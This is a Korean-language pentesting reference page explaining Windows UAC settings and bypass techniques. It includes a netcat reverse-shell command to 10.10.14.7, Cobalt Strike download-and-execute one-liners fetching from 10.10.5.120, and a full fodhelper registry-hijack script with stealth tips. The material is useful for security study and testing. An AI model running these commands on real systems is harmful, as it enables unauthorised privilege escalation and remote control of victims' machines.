# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 는 **권한 상승 작업에 대한 동의 프롬프트(consent prompt)를 제공하는 기능**입니다. 애플리케이션은 서로 다른 `integrity` 레벨을 가지며, **높은 레벨**의 프로그램은 **시스템을 손상시킬 수 있는 작업**을 수행할 수 있습니다. UAC가 활성화되어 있으면, 관리자가 해당 애플리케이션/작업에 관리자 수준 접근을 명시적으로 허용하지 않는 한 애플리케이션과 작업은 항상 **비관리자 계정의 보안 컨텍스트로 실행됩니다**. 이는 관리자가 의도치 않은 변경으로부터 보호하기 위한 편의 기능이나 보안 경계(security boundary)로 간주되지는 않습니다.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면, 관리자 사용자는 두 개의 토큰을 부여받습니다: 일반 작업을 수행하는 표준 사용자 토큰과 관리자 권한을 가진 토큰입니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 에서는 UAC의 동작을 심도 있게 설명하며 로그온 프로세스, 사용자 경험 및 UAC 아키텍처를 포함합니다. 관리자는 조직에 맞게 로컬 수준에서 보안 정책(secpol.msc)을 사용하여 UAC 동작을 구성하거나 Active Directory 도메인 환경에서 Group Policy Objects(GPO)를 통해 구성·배포할 수 있습니다. 다양한 설정은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 자세히 설명되어 있습니다. UAC에 대해 설정할 수 있는 Group Policy 설정은 10가지가 있으며, 아래 표는 추가 세부 정보를 제공합니다:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC 우회 이론

일부 프로그램은 사용자가 **administrator group**에 속해 있으면 **autoelevated automatically** 됩니다. 이러한 바이너리들은 내부 _**Manifests**_에 _**autoElevate**_ 옵션이 _**True**_로 설정되어 있습니다. 또한 해당 바이너리는 **signed by Microsoft** 되어 있어야 합니다.

많은 auto-elevate 프로세스는 **COM objects 또는 RPC servers를 통해 기능을 노출**하며, 이는 medium integrity(일반 사용자 권한)로 실행되는 프로세스에서 호출될 수 있습니다. 참고로 COM(Component Object Model)과 RPC(Remote Procedure Call)는 Windows 프로그램이 서로 다른 프로세스 간에 통신하고 기능을 실행하는 방법입니다. 예를 들어, **`IFileOperation COM object`**은 파일 작업(복사, 삭제, 이동)을 처리하도록 설계되었으며 프롬프트 없이 권한을 자동으로 상승시킬 수 있습니다.

일부 검사가 수행될 수 있다는 점을 주의해야 하는데, 예를 들어 프로세스가 **System32 directory**에서 실행되었는지 확인하는 검사 등이 있습니다. 이는 예를 들어 **injecting into explorer.exe** 또는 다른 System32에 위치한 실행 파일로 인젝션하여 우회할 수 있습니다.

이러한 검사들을 우회하는 또 다른 방법은 **PEB를 수정(modify the PEB)** 하는 것입니다. Windows의 모든 프로세스는 Process Environment Block(PEB)을 가지며, 여기에는 실행 파일 경로 같은 프로세스에 대한 중요한 데이터가 포함되어 있습니다. PEB를 수정하면 공격자는 자신의 악성 프로세스의 위치를 위조(spoof)하여 신뢰된 디렉터리(예: system32)에서 실행되는 것처럼 보이게 할 수 있습니다. 이렇게 위조된 정보는 COM 객체를 속여 사용자에게 프롬프트를 표시하지 않고 권한을 자동으로 상승시키게 합니다.

그 결과, UAC를 **bypass**(medium integrity 레벨에서 **high**로 상승)하기 위해 일부 공격자는 이러한 종류의 바이너리를 이용해 **arbitrary code를 실행**합니다. 이는 코드가 **High level integrity process**에서 실행되기 때문입니다.

바이너리의 _**Manifest**_를 확인하려면 Sysinternals의 도구 _**sigcheck.exe**_를 사용할 수 있습니다. (`sigcheck.exe -m <file>`) 프로세스의 **integrity level**은 _Process Explorer_ 또는 _Process Monitor_(Sysinternals)를 사용해 확인할 수 있습니다.

### Check UAC

UAC가 활성화되어 있는지 확인하려면:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
값이 **`1`**이면 UAC가 **활성화**된 것이고, 값이 **`0`**이거나 존재하지 않으면 UAC는 **비활성화**된 것입니다.

그런 다음 구성된 **레벨**을 확인하세요:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`**이면 UAC는 프롬프트를 표시하지 않습니다(예: **비활성화됨**)
- If **`1`**이면 관리자는 고권한으로 바이너리를 실행하기 위해 **사용자 이름과 비밀번호를 입력하라고 요청**받습니다( on Secure Desktop)
- If **`2`**(**항상 알림**)이면 관리자가 고권한으로 실행을 시도할 때 UAC는 항상 확인을 요청합니다( on Secure Desktop)
- If **`3`**는 `1`과 같지만 Secure Desktop에서는 필요하지 않습니다
- If **`4`**는 `2`와 같지만 Secure Desktop에서는 필요하지 않습니다
- if **`5`**(**기본값**)이면 비-Windows 바이너리를 고권한으로 실행할 때 관리자의 확인을 요구합니다

그다음으로 **`LocalAccountTokenFilterPolicy`** 값도 확인해야 합니다\
값이 **`0`**이면 **RID 500** 사용자(**built-in Administrator**)만 **UAC 없이 관리자 작업을 수행**할 수 있고, 값이 `1`이면 **"Administrators" 그룹에 속한 모든 계정**이 해당 작업을 수행할 수 있습니다.

마지막으로 키 **`FilterAdministratorToken`** 값도 확인하세요\
값이 **`0`**(기본값)이면 **built-in Administrator 계정은** 원격 관리 작업을 수행할 수 있고, 값이 **`1`**이면 built-in Administrator 계정은 원격 관리 작업을 수행할 수 없습니다. 단, `LocalAccountTokenFilterPolicy`가 `1`로 설정된 경우는 예외입니다.

#### Summary

- If `EnableLUA=0` or **존재하지 않음**, **모든 사용자에게 UAC 없음**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , 모든 사용자에게 UAC 없음**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, RID 500( Built-in Administrator )에게 UAC 없음**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, 모든 사용자에게 UAC 적용**

이 모든 정보는 **metasploit** 모듈을 사용하여 수집할 수 있습니다: `post/windows/gather/win_privs`

또한 사용자 계정의 그룹을 확인하고 integrity level(무결성 수준)을 확인할 수 있습니다:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> 피해자에게 그래픽 접근이 가능한 경우, UAC bypass는 간단합니다 — UAC 프롬프트가 표시될 때 단순히 "Yes"를 클릭하면 됩니다

UAC bypass는 다음 상황에서 필요합니다: **UAC가 활성화되어 있고, 프로세스가 medium integrity 컨텍스트에서 실행 중이며, 사용자가 administrators 그룹에 속해 있는 경우**.

특히 UAC가 최고 보안 수준(Always)에 있을 경우에는 다른 모든 레벨(Default)에 있을 때보다 **UAC를 우회하기가 훨씬 더 어렵다는 점**을 언급하는 것이 중요합니다.

### UAC 비활성화

UAC가 이미 비활성화되어 있는 경우 (`ConsentPromptBehaviorAdmin`은 **`0`**) 다음과 같이 **admin privileges로 reverse shell을 실행**(high integrity level)할 수 있습니다:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **매우** 기본적인 UAC "bypass" (전체 파일 시스템 접근)

Administrators group에 속한 사용자로 셸을 가지고 있다면, SMB(파일 시스템)를 통해 공유된 **mount the C$**를 새 드라이브에 로컬로 마운트할 수 있으며, 그러면 파일 시스템 내부의 모든 것에 **access to everything inside the file system**(심지어 Administrator home folder까지)에 접근하게 됩니다.

> [!WARNING]
> **이 트릭은 더 이상 작동하지 않는 것으로 보입니다**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike techniques는 UAC가 최대 보안 수준으로 설정되어 있지 않은 경우에만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**와 **Metasploit**에는 **UAC**를 **bypass**하기 위한 여러 모듈도 있습니다.

### KRBUACBypass

문서 및 도구: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME)은 여러 UAC bypass exploits의 **모음집**입니다. 참고로 **visual studio 또는 msbuild를 사용해 UACME를 컴파일해야 합니다**. 컴파일하면 여러 실행 파일(예: `Source\Akagi\outout\x64\Debug\Akagi.exe`)이 생성되며, **어떤 파일이 필요한지** 알아야 합니다.\
일부 bypasses는 **다른 프로그램을 실행하도록 유도**하여 그 프로그램들이 **사용자**에게 **무언가가 일어나고 있음을 알릴** 수 있으므로 **주의해야 합니다**.
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 페이지를 사용하면 빌드 버전에서 Windows 릴리스 `1607`을 확인할 수 있습니다.

### UAC Bypass – fodhelper.exe (Registry hijack)

신뢰된 바이너리 `fodhelper.exe`는 최신 Windows에서 자동으로 상승됩니다. 실행될 때, 아래의 per-user 레지스트리 경로를 조회하며 `DelegateExecute` verb를 검증하지 않습니다. 그곳에 명령을 심으면 Medium Integrity 프로세스(사용자가 Administrators에 속함)가 UAC 프롬프트 없이 High Integrity 프로세스를 생성할 수 있습니다.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell 단계 (payload를 설정한 다음 트리거):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- 현재 사용자가 Administrators 그룹의 멤버이고 UAC 레벨이 기본/완화(default/lenient)인 경우 작동합니다(추가 제한이 있는 Always Notify는 해당되지 않습니다).
- 64-bit Windows에서 32-bit 프로세스에서 64-bit PowerShell을 시작하려면 `sysnative` 경로를 사용하세요.
- Payload는 PowerShell, cmd 또는 EXE 경로 등 어떤 명령이든 될 수 있습니다. 스텔스를 위해 프롬프트를 띄우는 UI는 피하세요.

#### 추가 UAC 우회

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### GUI를 통한 UAC 우회

GUI에 접근할 수 있다면 UAC 프롬프트가 뜰 때 단순히 수락하면 되므로 실제로 우회가 필요하지 않습니다. 따라서 GUI 접근을 얻으면 UAC를 우회할 수 있습니다.

게다가, 누군가 사용 중이던 GUI 세션(예: RDP)을 획득하면, 관리자 권한으로 실행 중인 일부 도구들이 있어서 그 도구들로부터 예를 들어 **cmd**를 **as admin**으로 직접 실행할 수 있어 UAC에서 다시 프롬프트가 뜨지 않습니다. 이 방법이 약간 더 **stealthy**할 수 있습니다. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)

### 시끄러운 브루트포스 UAC 우회

시끄러움을 신경 쓰지 않는다면 **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 를 실행해 사용자가 수락할 때까지 권한 상승을 요청할 수 있습니다.

### 자체 우회 방법 - 기본 UAC 우회 방법론

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. 취약한 **autoelevate** 바이너리를 찾으세요(실행 시 높은 integrity level로 동작하는지 확인).
2. procmon으로 **"NAME NOT FOUND"** 이벤트를 찾아 **DLL Hijacking**에 취약한 부분을 확인하세요.
3. 악성 DLL을 _C:\Windows\System32_ 같은 쓰기 권한이 없는 **protected paths**에 **write**해야 할 수도 있습니다. 이를 우회하기 위해 다음을 사용할 수 있습니다:
1. **wusa.exe**: Windows 7,8 and 8.1. 이 도구는 높은 integrity level에서 실행되기 때문에 CAB 파일의 내용을 protected paths에 추출할 수 있게 합니다.
2. **IFileOperation**: Windows 10.
4. DLL을 protected path로 복사하고 취약하고 autoelevated된 바이너리를 실행하는 **script**를 준비하세요.

### 또 다른 UAC 우회 기법

이는 **autoElevated binary**가 **registry**에서 실행할 **binary** 또는 **command**의 **name/path**를 **read**하려 하는지 감시하는 방식입니다(해당 바이너리가 이 정보를 **HKCU**에서 찾는 경우 더 흥미롭습니다).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
